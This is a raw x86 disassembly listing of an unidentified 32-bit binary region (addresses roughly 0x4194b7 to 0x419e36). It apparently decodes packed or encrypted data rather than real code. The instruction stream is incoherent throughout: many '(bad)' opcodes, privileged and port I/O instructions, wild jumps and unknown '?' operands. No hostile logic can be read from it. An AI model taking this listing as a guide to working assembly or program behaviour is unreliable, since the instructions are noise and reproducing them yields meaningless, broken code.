  4194b7:	xchg   esp,eax
  4194b8:	adc    cl,BYTE PTR [edi-0x42b7fdac]
  4194be:	loop   0x4194fc
  4194c0:	sar    DWORD PTR [ebx+0x4e],0xc1
  4194c4:	aaa    
  4194c5:	xchg   edx,eax
  4194c6:	fbld   TBYTE PTR [esp+eiz*4-0x2972cdb9]
  4194cd:	ror    DWORD PTR [edx],1
  4194cf:	pop    ss
  4194d0:	gs (bad) 
  4194d2:	xchg   esp,eax
  4194d3:	pushf  
  4194d4:	lock jns 0x41949b
  4194d7:	add    cl,BYTE PTR [ecx-0x40]
  4194da:	(bad)  
  4194db:	cmp    ecx,eax
  4194dd:	(bad)  
  4194de:	sbb    ebx,DWORD PTR [ebp-0xf]
  4194e1:	pop    ds
  4194e2:	mov    dl,0xf7
  4194e4:	mov    edx,0xfe730ab8
  4194e9:	iret   
  4194ea:	idiv   BYTE PTR [ebx]
  4194ec:	xchg   ecx,eax
  4194ed:	push   es
  4194ee:	lods   al,BYTE PTR ds:[esi]
  4194ef:	adc    DWORD PTR [edi+ebp*4-0x5ad1c76a],ecx
  4194f6:	lahf   
  4194f7:	dec    ebp
  4194f8:	jecxz  0x419532
  4194fa:	imul   edi,esi,0x50
  4194fd:	loopne 0x419498
  4194ff:	(bad)  [edx-0x2a]
  419502:	sub    dh,BYTE PTR [ebx]
  419504:	mov    bl,0x6
  419506:	or     eax,0x18c3181e
  41950b:	hlt    
  41950c:	mov    dh,0xd8
  41950e:	dec    ebp
  41950f:	aas    
  419510:	jmp    0x3a5ae670
  419515:	int    0x51
  419517:	ret    0x7549
  41951a:	out    dx,al
  41951b:	gs pop ds
  41951d:	xchg   BYTE PTR [eax-0x1dac2f6d],ch
  419523:	push   eax
  419524:	lock in al,0xe2
  419527:	add    edx,edi
  419529:	xchg   edx,eax
  41952a:	xor    al,0x88
  41952c:	mov    ?,esi
  41952e:	sbb    al,BYTE PTR [ecx]
  419530:	fist   DWORD PTR [edi]
  419532:	xor    BYTE PTR [edx+0x3170cdbb],ch
  419538:	enter  0xd311,0x96
  41953c:	adc    al,0x1c
  41953e:	sub    DWORD PTR [eax+0x6b],esp
  419541:	or     dh,BYTE PTR [ebp-0x6c]
  419544:	xor    eax,0xd1377ffa
  419549:	in     al,0x5
  41954b:	or     al,0xd1
  41954d:	pop    esp
  41954e:	loope  0x419504
  419550:	adc    DWORD PTR [ebx-0x2946f49f],edi
  419556:	idiv   DWORD PTR [edx-0x4bedcff6]
  41955c:	pop    eax
  41955d:	xor    ebx,edx
  41955f:	sti    
  419560:	ds icebp 
  419562:	mov    edx,0xb940f0bf
  419567:	inc    ecx
  419568:	mov    eax,ds:0x272a5586
  41956d:	and    eax,0xfb733ab4
  419572:	pop    edx
  419573:	push   ds
  419574:	or     esp,ecx
  419576:	pop    ds
  419577:	jbe    0x419594
  419579:	stos   DWORD PTR es:[edi],eax
  41957a:	pop    edi
  41957b:	repnz adc dl,dl
  41957e:	scas   eax,DWORD PTR es:[edi]
  41957f:	(bad)  
  419580:	jnp    0x419558
  419582:	sbb    al,0x3f
  419584:	adc    BYTE PTR ds:0x5983e2ad,0xe0
  41958b:	jno    0x419586
  41958d:	xor    DWORD PTR [edx],0x76fa0c17
  419593:	inc    esp
  419594:	imul   ebx,DWORD PTR [edx],0x13
  419597:	scas   eax,DWORD PTR es:[edi]
  419598:	adc    cl,BYTE PTR [ecx+0x1a]
  41959b:	inc    edx
  41959c:	fmul   QWORD PTR [esi]
  41959e:	clc    
  41959f:	mov    edx,0x783d9ffe
  4195a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4195a5:	addr16 mov dh,0xf8
  4195a8:	cs jno 0x41958e
  4195ab:	ret    0x6fe0
  4195ae:	bound  esi,QWORD PTR [edx-0x5e0c84ee]
  4195b4:	pop    cx
  4195b6:	call   0x2b310677
  4195bb:	arpl   WORD PTR [esi+ebp*1-0x3],si
  4195bf:	sbb    BYTE PTR [esi-0x1041a978],bh
  4195c5:	(bad)  
  4195c6:	fwait
  4195c7:	mov    ecx,0x74036c0e
  4195cc:	(bad)  
  4195cd:	jne    0x4195ac
  4195cf:	(bad)  
  4195d0:	push   edx
  4195d1:	add    eax,0x47abd372
  4195d6:	pop    ebx
  4195d7:	adc    al,0xf1
  4195d9:	mov    cl,0x4b
  4195db:	jnp    0x419652
  4195dd:	pop    es
  4195de:	push   0x4b44e56b
  4195e3:	jno    0x419607
  4195e5:	test   al,0x5c
  4195e7:	iret   
  4195e8:	repz jno 0x419585
  4195eb:	addr16 jl 0x419617
  4195ee:	adc    eax,0x8aad40a3
  4195f3:	mov    edx,esi
  4195f5:	aaa    
  4195f6:	pop    eax
  4195f7:	and    BYTE PTR [ebx+0x42191f54],ah
  4195fd:	jb     0x419669
  4195ff:	adc    BYTE PTR [esi-0x49],bh
  419602:	(bad)  
  419603:	push   0xffffff97
  419605:	addr16 test eax,0x5d8bd0be
  41960b:	pop    esi
  41960c:	aas    
  41960d:	loope  0x419688
  41960f:	es jl  0x4195cb
  419612:	iret   
  419613:	and    BYTE PTR [edx+ebp*2],cl
  419616:	xor    eax,0xafb63f31
  41961b:	xchg   ebp,eax
  41961c:	retf   0x11c
  41961f:	jmp    0x419627
  419621:	aaa    
  419622:	mov    bl,0x29
  419624:	fisub  WORD PTR [ebx]
  419626:	scas   eax,DWORD PTR es:[edi]
  419627:	jmp    DWORD PTR [edi]
  419629:	xor    eax,0x92d275cc
  41962e:	xor    dh,BYTE PTR [ebx+0x1f]
  419631:	cmp    bl,BYTE PTR [edx+0x5a18f868]
  419637:	shl    DWORD PTR ds:0xefd99a1,0x4f
  41963e:	sti    
  41963f:	sub    ecx,DWORD PTR [eax+0x1f]
  419642:	and    DWORD PTR [ecx-0x44b8722b],0xffffffd5
  419649:	(bad)  
  41964a:	xor    BYTE PTR [ecx-0x3135f121],bh
  419650:	and    DWORD PTR [edi],0x874f2b75
  419656:	mov    bh,BYTE PTR [ecx]
  419658:	dec    esi
  419659:	xchg   esi,eax
  41965a:	push   0x77
  41965c:	neg    ah
  41965e:	and    esp,DWORD PTR [ecx]
  419660:	sub    al,0x49
  419662:	mov    dl,0x5f
  419664:	mov    ss,WORD PTR [ecx]
  419666:	loop   0x4196b1
  419668:	shl    DWORD PTR [esi],0x85
  41966b:	cdq    
  41966c:	icebp  
  41966d:	cmp    eax,0x1249ef25
  419672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419673:	mul    BYTE PTR [esi+0x1ca4c93c]
  419679:	xchg   DWORD PTR [edx],edx
  41967b:	fcmovnu st,st(1)
  41967d:	pop    esi
  41967e:	cmp    BYTE PTR [ecx-0xbd1a11b],bl
  419684:	gs ins BYTE PTR es:[edi],dx
  419686:	mov    bh,BYTE PTR [edi+edx*1]
  419689:	stc    
  41968a:	scas   al,BYTE PTR es:[edi]
  41968b:	out    dx,eax
  41968c:	mov    eax,ds:0xa30f46f7
  419691:	mov    ds:0xd6fdc898,eax
  419696:	cmp    al,0x17
  419698:	inc    eax
  419699:	loope  0x419711
  41969b:	add    BYTE PTR [eax+ebx*1-0x1e],cl
  41969f:	jbe    0x41966b
  4196a1:	ror    DWORD PTR [ecx+eiz*4-0x5de722c4],0x1e
  4196a9:	push   edi
  4196aa:	jno    0x4196fb
  4196ac:	jmp    0x8278:0x6a0384e9
  4196b3:	jge    0x4196a1
  4196b5:	mov    edx,ecx
  4196b7:	ja     0x41968f
  4196b9:	inc    edi
  4196ba:	inc    edi
  4196bb:	pop    edi
  4196bc:	addr16 inc edx
  4196be:	ins    BYTE PTR es:[edi],dx
  4196bf:	into   
  4196c0:	in     al,dx
  4196c1:	lods   eax,DWORD PTR ds:[esi]
  4196c2:	cmc    
  4196c3:	sub    ah,BYTE PTR [esi]
  4196c5:	or     eax,0xb8576a9e
  4196ca:	xchg   BYTE PTR [ecx+0x1a],bh
  4196cd:	leave  
  4196ce:	xlat   BYTE PTR ds:[ebx]
  4196cf:	fist   DWORD PTR [ebx+0xf]
  4196d2:	mov    esi,0xc19c46b2
  4196d7:	ins    BYTE PTR es:[edi],dx
  4196d8:	sahf   
  4196d9:	outs   dx,DWORD PTR ds:[esi]
  4196da:	sbb    ch,BYTE PTR [edx+ebp*2+0x6e6b6a1]
  4196e1:	jge    0x419755
  4196e3:	push   0x78
  4196e5:	mov    bl,0x70
  4196e7:	add    ecx,DWORD PTR [eax-0x61]
  4196ea:	nop
  4196eb:	fldenv [ebp+0x38]
  4196ee:	mov    ecx,0x98810e8b
  4196f3:	jp     0x41968d
  4196f5:	loope  0x419680
  4196f7:	cmp    eax,0x88c157d8
  4196fc:	mov    edi,0x74c38030
  419701:	dec    edx
  419702:	xor    al,0xa9
  419704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419705:	push   es
  419706:	pop    edi
  419707:	sub    al,0x97
  419709:	sbb    eax,0xafff78e
  41970e:	pop    ecx
  41970f:	ss lahf 
  419711:	sub    al,bl
  419713:	cmp    al,0x60
  419715:	pop    edx
  419716:	ret    0x9527
  419719:	(bad)  
  41971b:	or     DWORD PTR [ecx+ecx*2],edi
  41971e:	sub    eax,0x87d423fc
  419723:	adc    BYTE PTR [edi+0x14556cb8],bh
  419729:	jg     0x419702
  41972b:	add    DWORD PTR [edx-0x73],0xffffff9c
  41972f:	ins    DWORD PTR es:[edi],dx
  419730:	xor    al,0x94
  419732:	(bad)  
  419734:	cmp    ch,BYTE PTR [eax]
  419736:	ror    BYTE PTR [edi+eax*8+0x12c85680],cl
  41973d:	mov    edi,0xd8818073
  419742:	adc    ebp,DWORD PTR [eax-0x63ff5d2c]
  419748:	sbb    al,0xf8
  41974a:	cli    
  41974b:	pop    ds
  41974c:	jnp    0x4197a3
  41974e:	sbb    eax,0x2960f84c
  419753:	mov    ?,WORD PTR [edx]
  419755:	les    ebp,FWORD PTR [ecx-0x40]
  419758:	pop    es
  419759:	repnz bound edi,QWORD PTR [ebx]
  41975c:	inc    ebp
  41975d:	and    BYTE PTR [eax],dh
  41975f:	pop    eax
  419760:	fadd   QWORD PTR [ebx]
  419762:	and    ecx,0xf1a87acc
  419768:	cmp    ebx,0xffffffa5
  41976b:	das    
  41976c:	xor    ah,ah
  41976e:	push   0x68
  419770:	and    cl,BYTE PTR [ebx+0x6cdce456]
  419776:	test   eax,0x3afb5f
  41977b:	scas   al,BYTE PTR es:[edi]
  41977c:	fstp   QWORD PTR [eax]
  41977e:	sbb    eax,0xb346772b
  419783:	sti    
  419784:	xchg   ebx,eax
  419785:	dec    edx
  419786:	es mov dh,0xb1
  419789:	sti    
  41978a:	js     0x419782
  41978c:	push   ebp
  41978d:	add    ebp,ecx
  41978f:	repz data16 hlt 
  419792:	push   cs
  419793:	xchg   ebx,eax
  419794:	jb     0x41976a
  419796:	xchg   DWORD PTR [esi-0x57],ecx
  419799:	xor    eax,esi
  41979b:	push   esp
  41979c:	or     cl,dl
  41979e:	push   ecx
  41979f:	xor    al,0xd1
  4197a1:	arpl   WORD PTR [ecx+0x3690521e],bp
  4197a7:	jnp    0x419740
  4197a9:	sbb    ah,BYTE PTR [edi]
  4197ab:	call   DWORD PTR [eax-0x4f5d0568]
  4197b1:	mov    BYTE PTR [ecx-0x652a76b0],0x21
  4197b8:	outs   dx,BYTE PTR ds:[esi]
  4197b9:	ins    BYTE PTR es:[edi],dx
  4197ba:	mov    eax,0x6481639d
  4197bf:	les    ecx,FWORD PTR [ebx+0x2]
  4197c2:	or     ah,ch
  4197c4:	jnp    0x41974a
  4197c6:	je     0x419760
  4197c8:	sbb    edx,DWORD PTR [esi]
  4197ca:	and    DWORD PTR [ecx+eax*1],ebx
  4197cd:	sub    al,0x4d
  4197cf:	mov    bh,0xff
  4197d1:	inc    ecx
  4197d2:	mov    dl,BYTE PTR [edx+0x21c3faa5]
  4197d8:	outs   dx,DWORD PTR ds:[esi]
  4197d9:	push   ss
  4197da:	outs   dx,DWORD PTR ds:[esi]
  4197db:	ror    ch,cl
  4197dd:	clc    
  4197de:	sar    BYTE PTR [esi],cl
  4197e0:	pusha  
  4197e1:	aaa    
  4197e2:	jle    0x4197ee
  4197e4:	or     eax,0x51376e0f
  4197e9:	inc    ebx
  4197ea:	inc    ebp
  4197eb:	adc    bl,BYTE PTR [ecx]
  4197ed:	(bad)  
  4197ee:	das    
  4197ef:	and    BYTE PTR [edx-0x41959f92],al
  4197f5:	out    0xb2,al
  4197f7:	mov    ah,0x98
  4197f9:	cmp    al,0x3b
  4197fb:	xchg   ebx,eax
  4197fc:	sbb    al,0x56
  4197fe:	sub    dh,bh
  419800:	stos   BYTE PTR es:[edi],al
  419801:	jne    0x419869
  419803:	(bad)  
  419804:	ins    BYTE PTR es:[edi],dx
  419805:	hlt    
  419806:	mov    dl,0xb0
  419808:	jecxz  0x419873
  41980a:	mov    ds:0xdfc47ee9,al
  41980f:	dec    esp
  419810:	sbb    BYTE PTR [ebx+0x35],dl
  419813:	pushf  
  419814:	push   eax
  419815:	fwait
  419816:	cmc    
  419817:	inc    ebp
  419818:	repnz xchg esi,ebp
  41981b:	dec    eax
  41981c:	mov    dl,cl
  41981e:	or     al,0xf5
  419820:	jbe    0x419896
  419822:	xchg   ebx,eax
  419823:	fmulp  st(0),st
  419825:	inc    esp
  419826:	jnp    0x41986a
  419828:	pop    eax
  419829:	jl     0x4197c1
  41982b:	leave  
  41982c:	sub    DWORD PTR [edx+0x1e],esi
  41982f:	xchg   esi,eax
  419830:	stos   DWORD PTR es:[edi],eax
  419831:	retf   0xa021
  419834:	pop    sp
  419836:	imul   esp,DWORD PTR [ebx+0x57],0xffffffe8
  41983a:	sahf   
  41983b:	pop    ebx
  41983c:	and    ecx,ecx
  41983e:	shr    BYTE PTR [eax+0x4f],1
  419841:	cmp    dh,bl
  419843:	mov    cl,0x96
  419845:	test   eax,0xaf817281
  41984a:	rcl    DWORD PTR [edi-0x6e],0xf3
  41984e:	sub    edx,DWORD PTR [edx-0x68e18fa3]
  419854:	lods   al,BYTE PTR ds:[esi]
  419855:	jne    0x4198d5
  419857:	jns    0x4197ef
  419859:	xor    ebx,DWORD PTR ds:0xf1aa56ac
  41985f:	test   BYTE PTR [edx-0x326f1436],0x58
  419866:	and    edx,DWORD PTR ds:0x6bc00cb8
  41986c:	and    BYTE PTR es:[ebx-0x28],0x79
  419871:	mov    bh,0xf0
  419873:	jge    0x41987c
  419875:	mov    ebp,0x69814392
  41987a:	push   edx
  41987b:	mov    ebx,0x5a4b5943
  419880:	xor    al,0x39
  419882:	mov    cl,0xba
  419884:	shr    DWORD PTR [esi-0x52],0xb7
  419888:	push   cs
  419889:	add    eax,0x78bcb9a7
  41988e:	mov    eax,0xc2fb8070
  419893:	pushf  
  419894:	or     DWORD PTR [edx],0x72
  419897:	pop    eax
  419898:	adc    BYTE PTR [ebx+eiz*8-0x20],ah
  41989c:	adc    edx,0xffffffc6
  41989f:	std    
  4198a0:	sar    DWORD PTR [ebp+0x12],0x79
  4198a4:	loop   0x41990d
  4198a6:	loopne 0x41983e
  4198a8:	pop    ebp
  4198a9:	ja     0x419870
  4198ab:	jge    0x419905
  4198ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198ae:	(bad)  
  4198af:	out    dx,eax
  4198b0:	pop    ss
  4198b1:	jnp    0x419835
  4198b3:	push   esi
  4198b4:	xchg   edi,eax
  4198b5:	pop    ss
  4198b6:	ja     0x419881
  4198b8:	xor    DWORD PTR [esi-0x372501a],esp
  4198be:	loope  0x419873
  4198c0:	or     al,0x64
  4198c3:	ss (bad) 
  4198c6:	jo     0x4198b3
  4198c8:	lods   al,BYTE PTR ds:[esi]
  4198c9:	mov    bl,0x76
  4198cb:	cli    
  4198cc:	nop
  4198cd:	mov    WORD PTR [ebx],es
  4198cf:	lock lds ebp,FWORD PTR [ecx-0x541ee03f]
  4198d6:	fidivr WORD PTR [esi+ebx*1]
  4198d9:	mov    ebx,0x804b528f
  4198de:	rol    BYTE PTR [ecx+0x4a],cl
  4198e1:	ficom  DWORD PTR [ecx]
  4198e3:	dec    eax
  4198e4:	stos   DWORD PTR es:[edi],eax
  4198e5:	mov    ah,0xe3
  4198e7:	cli    
  4198e8:	mov    eax,0xcad606ba
  4198ed:	dec    ecx
  4198ee:	inc    ecx
  4198ef:	(bad)  
  4198f0:	ffreep st(4)
  4198f2:	or     BYTE PTR [esi],0x7d
  4198f5:	(bad)  
  4198f7:	wbinvd 
  4198f9:	aaa    
  4198fa:	pushf  
  4198fb:	pop    esi
  4198fc:	inc    esi
  4198fd:	mov    bh,0x94
  4198ff:	xchg   ecx,eax
  419900:	retf   
  419901:	mov    WORD PTR [esi+0x462ada93],?
  419907:	nop
  419908:	lods   al,BYTE PTR ds:[esi]
  419909:	and    al,0xfe
  41990b:	push   edx
  41990c:	mov    edx,0xe0681149
  419911:	cwde   
  419912:	sbb    edi,edi
  419914:	mov    ds:0xa265bb43,al
  419919:	daa    
  41991a:	and    al,0xd2
  41991c:	repnz add BYTE PTR [eax],al
	...
  419aef:	add    BYTE PTR [eax],al
  419af1:	push   0xc
  419af3:	lea    ebx,[eax-0x1806611]
  419af9:	into   
  419afa:	out    dx,al
  419afb:	popf   
  419afc:	adc    eax,edx
  419afe:	fisub  WORD PTR ds:0x1937b32
  419b04:	add    BYTE PTR [eax],ah
  419b06:	pop    es
  419b07:	add    BYTE PTR [eax],al
  419b09:	fdiv   st,st(0)
  419b0b:	jmp    0x742f6e06
  419b10:	sub    eax,0x9dfdab5d
  419b15:	mov    esp,0x4259708b
  419b1a:	neg    DWORD PTR [esi+0x2a]
  419b1d:	add    cl,BYTE PTR [edx-0x26]
  419b20:	push   ebp
  419b21:	dec    esi
  419b22:	cmp    DWORD PTR [ecx+0x7f],0x426857b
  419b29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b2a:	mov    bh,0xb5
  419b2c:	std    
  419b2d:	and    BYTE PTR [esi+0x12f75c36],bl
  419b33:	add    DWORD PTR [ebp-0x2a582617],ebx
  419b39:	and    DWORD PTR [ecx+0x56f249d],ecx
  419b3f:	shr    DWORD PTR [esp+edx*8-0x69],cl
  419b43:	(bad)  
  419b45:	pop    esi
  419b46:	ins    BYTE PTR es:[edi],dx
  419b47:	or     al,0x70
  419b49:	pop    ebx
  419b4a:	(bad)  
  419b4b:	js     0x419b8f
  419b4d:	sub    al,0xf5
  419b4f:	hlt    
  419b50:	xor    al,0x12
  419b52:	stos   DWORD PTR es:[edi],eax
  419b53:	nop
  419b54:	(bad)
  419b57:	xor    BYTE PTR [esi-0x4c9dfb35],bl
  419b5d:	arpl   di,ax
  419b5f:	gs addr16 cmp al,0xf9
  419b63:	imul   edx,DWORD PTR [eax-0x5d17b33b],0x4a6ca4bd
  419b6d:	add    BYTE PTR [esi-0x13b5fdff],bh
  419b73:	fiadd  WORD PTR [edx]
  419b75:	sbb    BYTE PTR [eax-0x5391e5f1],ah
  419b7b:	adc    eax,0xa799be00
  419b80:	push   ebx
  419b81:	xchg   DWORD PTR [ebx-0x34],ebx
  419b84:	mov    ds:0x56cc2a77,eax
  419b89:	xchg   ebx,eax
  419b8a:	or     eax,0xa8986111
  419b8f:	xor    BYTE PTR [ebp-0x79],0x11
  419b93:	xor    ecx,DWORD PTR [ecx-0x64]
  419b96:	inc    esi
  419b97:	jb     0x419b48
  419b99:	jns    0x419b90
  419b9b:	test   BYTE PTR [ebx],dh
  419b9d:	addr16 nop
  419b9f:	xchg   bl,bh
  419ba1:	shr    DWORD PTR [esi+ecx*2-0x7e8c84be],0x73
  419ba9:	or     DWORD PTR [eax],edi
  419bab:	mov    ecx,0x3c8292c7
  419bb0:	inc    edx
  419bb1:	push   edi
  419bb2:	aaa    
  419bb3:	mov    dl,0xe9
  419bb5:	mov    ah,0xad
  419bb7:	fmul   DWORD PTR [edi+0x33]
  419bba:	ret    0x17fb
  419bbd:	inc    esi
  419bbe:	push   0xffffffe6
  419bc0:	xchg   bl,ah
  419bc2:	mov    edi,0x1b1a49cb
  419bc7:	and    DWORD PTR [edx],esi
  419bc9:	out    0x87,al
  419bcb:	loopne 0x419b7a
  419bcd:	push   esi
  419bce:	test   BYTE PTR [ebp-0x1852dd5e],dl
  419bd4:	in     al,0x9c
  419bd6:	fmul   DWORD PTR ss:[esi+edx*4-0x536337ee]
  419bde:	xor    al,0xe5
  419be0:	out    dx,al
  419be1:	adc    eax,eax
  419be3:	(bad)  
  419be4:	enter  0xd3ba,0xfb
  419be8:	fdivp  st(2),st
  419bea:	mov    ah,0x9
  419bec:	call   0x2912:0x7686b227
  419bf3:	sti    
  419bf4:	push   edx
  419bf5:	pop    edx
  419bf6:	and    BYTE PTR [ecx+0x55],dl
  419bf9:	popa   
  419bfa:	sti    
  419bfb:	mov    BYTE PTR [edi-0x56a53c00],dh
  419c01:	sub    al,0x7c
  419c03:	loope  0x419bd8
  419c05:	xchg   ebx,eax
  419c06:	inc    esp
  419c07:	(bad)
  419c0b:	mov    eax,ds:0x7d81679
  419c10:	shl    DWORD PTR [esi+ecx*2],cl
  419c13:	inc    ebp
  419c14:	mov    edi,0xcd0cb1dc
  419c19:	movzx  ecx,BYTE PTR [ebx]
  419c1c:	outs   dx,BYTE PTR ds:[esi]
  419c1d:	pop    ebp
  419c1e:	jmp    0xd42d:0x656433c
  419c25:	popf   
  419c26:	ins    BYTE PTR es:[edi],dx
  419c27:	mov    BYTE PTR [ecx-0x5dafa7e],ch
  419c2d:	shl    DWORD PTR [edx+0x3],cl
  419c30:	inc    esp
  419c31:	sbb    BYTE PTR [edi+0x5],al
  419c34:	xchg   ebp,eax
  419c36:	outs   dx,WORD PTR ds:[esi]
  419c38:	push   0xffffffd5
  419c3a:	mov    ss,WORD PTR [ebx+0x5d1f73e8]
  419c40:	mov    al,0x43
  419c42:	mov    esi,0x6183f2e1
  419c47:	cmc    
  419c48:	mov    cl,0x82
  419c4a:	(bad)  
  419c4b:	stos   DWORD PTR es:[edi],eax
  419c4c:	inc    edx
  419c4d:	mov    ds:0x7204812b,eax
  419c52:	mov    ecx,0xbfe37ddd
  419c57:	inc    ebx
  419c58:	dec    esi
  419c59:	jbe    0x419c12
  419c5b:	push   0x42
  419c5d:	add    dl,dh
  419c5f:	(bad)  
  419c60:	adc    bh,ah
  419c62:	fnstcw WORD PTR [ecx-0x58]
  419c65:	hlt    
  419c66:	mov    ch,0xa0
  419c68:	mov    WORD PTR [edx],cs
  419c6a:	mov    ds:0x30ad7b29,eax
  419c6f:	test   al,0x4e
  419c71:	ins    DWORD PTR es:[edi],dx
  419c72:	mov    BYTE PTR [ebx],ch
  419c74:	mov    al,0x14
  419c76:	mov    ebx,0x159db355
  419c7b:	pop    ecx
  419c7c:	and    BYTE PTR [ebp+ebp*4+0x16],cl
  419c80:	xor    dh,BYTE PTR [edi-0xe6881b9]
  419c86:	mov    esp,0xed56b2ba
  419c8b:	jmp    0x90e5ce23
  419c90:	push   ecx
  419c91:	cld    
  419c92:	cld    
  419c93:	push   0xffffffdf
  419c95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419c96:	xchg   edx,ecx
  419c98:	out    0x99,al
  419c9a:	cmp    eax,DWORD PTR [ebx]
  419c9c:	int3   
  419c9d:	pop    ebp
  419c9e:	in     eax,0x42
  419ca0:	fcmovu st,st(5)
  419ca2:	jb     0x419c27
  419ca4:	add    ch,al
  419ca6:	shl    ebp,cl
  419ca8:	loopne 0x419ccb
  419caa:	shl    DWORD PTR [esi],1
  419cac:	mov    cr2,ebx
  419caf:	stc    
  419cb0:	adc    ch,bh
  419cb2:	inc    ecx
  419cb3:	cmp    al,0xac
  419cb5:	jne    0x419cf8
  419cb7:	fistp  DWORD PTR [edx-0x53]
  419cba:	fsubr  st,st(3)
  419cbc:	repz or ah,al
  419cbf:	gs push 0xffffffe3
  419cc2:	jg     0x419c9f
  419cc4:	mov    edi,0x5f5c534c
  419cc9:	add    bh,BYTE PTR [ecx+0x54]
  419ccc:	xor    DWORD PTR [ecx-0x4d61f48d],esp
  419cd2:	sub    eax,0x2ecb6f1
  419cd7:	(bad)  
  419cd8:	lock clc 
  419cda:	sub    cl,BYTE PTR [edi-0x68988ad5]
  419ce0:	push   0x2c251b35
  419ce5:	jl     0x419c96
  419ce7:	(bad)
  419cea:	shr    BYTE PTR [ebx],1
  419cec:	loopne 0x419c9e
  419cee:	mov    bl,BYTE PTR [edi+ebp*2-0x1]
  419cf2:	sahf   
  419cf3:	sbb    DWORD PTR [edx-0x19],ebp
  419cf6:	out    dx,eax
  419cf7:	out    0x97,eax
  419cf9:	cmp    cl,al
  419cfb:	imul   ebx,DWORD PTR [edi-0x31],0x6d313b79
  419d02:	shr    DWORD PTR [ebp+0xf],0xbd
  419d06:	mov    ch,0x84
  419d08:	shr    DWORD PTR [eax+0x69],cl
  419d0b:	sub    edx,DWORD PTR [esi-0x2d]
  419d0e:	test   al,0x4
  419d10:	add    BYTE PTR [eax-0x25],0x15
  419d14:	sti    
  419d15:	iret   
  419d16:	addr16 hlt 
  419d18:	adc    DWORD PTR [ecx+0x5c],esp
  419d1b:	loop   0x419d31
  419d1d:	jl     0x419cb2
  419d1f:	pop    esi
  419d20:	cmp    DWORD PTR ss:[ebp+0x0],ebx
  419d24:	fs loope 0x419d61
  419d27:	popf   
  419d28:	sbb    DWORD PTR [ebp-0x60],ebx
  419d2b:	mov    ds:0xf3a8466c,eax
  419d30:	pop    esi
  419d31:	int    0x51
  419d33:	adc    esi,edi
  419d35:	sbb    al,BYTE PTR [edi-0x35]
  419d38:	add    BYTE PTR [eax+0x7dcfd635],0xbd
  419d3f:	mov    dl,ch
  419d41:	jno    0x419d0e
  419d43:	or     dl,bh
  419d45:	out    0x53,al
  419d47:	inc    edx
  419d48:	mov    dh,0xc8
  419d4a:	pusha  
  419d4b:	inc    eax
  419d4c:	pusha  
  419d4d:	imul   ebp,ebx,0xffffff83
  419d50:	aad    0x60
  419d52:	into   
  419d53:	dec    eax
  419d54:	cli    
  419d55:	pop    eax
  419d56:	xor    edx,DWORD PTR [edi]
  419d58:	ins    BYTE PTR es:[edi],dx
  419d59:	lds    ebp,FWORD PTR [ebx-0xb37104b]
  419d5f:	pop    ebp
  419d60:	test   BYTE PTR [edx],dh
  419d62:	das    
  419d63:	adc    eax,0xc5f29482
  419d68:	das    
  419d69:	nop
  419d6a:	and    BYTE PTR [eax+ebx*2],cl
  419d6d:	arpl   WORD PTR ds:0xfd93f876,cx
  419d73:	rcl    BYTE PTR ds:0xe64d0774,1
  419d79:	jo     0x419dba
  419d7b:	repnz adc DWORD PTR [eax],0x42
  419d7f:	jge    0x419df8
  419d81:	jmp    0x419d6e
  419d83:	ins    DWORD PTR es:[edi],dx
  419d84:	inc    ebp
  419d85:	out    dx,al
  419d86:	jmp    0x419d0e
  419d88:	cmp    al,0xa3
  419d8a:	inc    ebp
  419d8b:	xchg   ebp,eax
  419d8c:	xor    dl,ah
  419d8e:	or     ch,ah
  419d90:	(bad)  
  419d91:	jb     0x419d7f
  419d93:	cmp    BYTE PTR [ecx-0x75],dl
  419d96:	repz mov eax,ds:0xe7521657
  419d9c:	bound  ebx,QWORD PTR ds:0xdcd35ebc
  419da2:	ins    DWORD PTR es:[edi],dx
  419da3:	loop   0x419d85
  419da5:	mov    ds:0xe402ff3e,eax
  419daa:	pop    esi
  419dab:	dec    esi
  419dac:	pop    edx
  419dad:	xlat   BYTE PTR ds:[ebx]
  419dae:	sbb    ecx,ecx
  419db0:	jecxz  0x419db8
  419db2:	ror    ah,cl
  419db4:	jnp    0x419de8
  419db6:	cwde   
  419db7:	jo     0x419dcb
  419db9:	pop    ss
  419dba:	mov    eax,ds:0xe14cf40d
  419dbf:	push   ds
  419dc0:	sahf   
  419dc1:	pushf  
  419dc2:	retf   0x9068
  419dc5:	adc    DWORD PTR [esi+0x3546bb11],ebx
  419dcb:	mov    ecx,0x740a54e0
  419dd0:	push   esi
  419dd1:	and    al,0xb1
  419dd3:	jno    0x419dc0
  419dd5:	mov    bh,BYTE PTR [eax-0x1c]
  419dd8:	xor    ah,ah
  419dda:	fs jo  0x419e1a
  419ddd:	lahf   
  419dde:	jge    0x419de3
  419de0:	pop    ss
  419de1:	shr    DWORD PTR [ebp-0x2b9821e4],0x86
  419de8:	ja     0x419e12
  419dea:	fwait
  419deb:	cmp    BYTE PTR [ebp-0x110643d5],0xe0
  419df2:	or     bh,al
  419df4:	jmp    0x419dc4
  419df6:	imul   edi,DWORD PTR [edi+0x74],0x3d42749b
  419dfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dfe:	pop    ecx
  419dff:	shl    ecx,0x5
  419e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e03:	and    cl,BYTE PTR ds:0x9dc28362
  419e09:	scas   al,BYTE PTR es:[edi]
  419e0a:	clc    
  419e0b:	shr    esi,cl
  419e0d:	das    
  419e0e:	push   es
  419e0f:	or     DWORD PTR ds:[esi],esi
  419e12:	add    al,0xe4
  419e14:	push   edi
  419e15:	pop    ebp
  419e16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e18:	sahf   
  419e19:	es (bad) 
  419e1b:	xchg   ebp,eax
  419e1c:	ss icebp 
  419e1e:	sub    al,0x49
  419e20:	in     eax,0xd
  419e22:	pusha  
  419e23:	jnp    0x419de6
  419e25:	int3   
  419e26:	enter  0xd18d,0xdb
  419e2a:	add    ebp,ebp
  419e2c:	fucomi st,st(4)
  419e2e:	mov    esp,0x578f0f81
  419e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e34:	xor    edx,esp
  419e36:	inc    esp
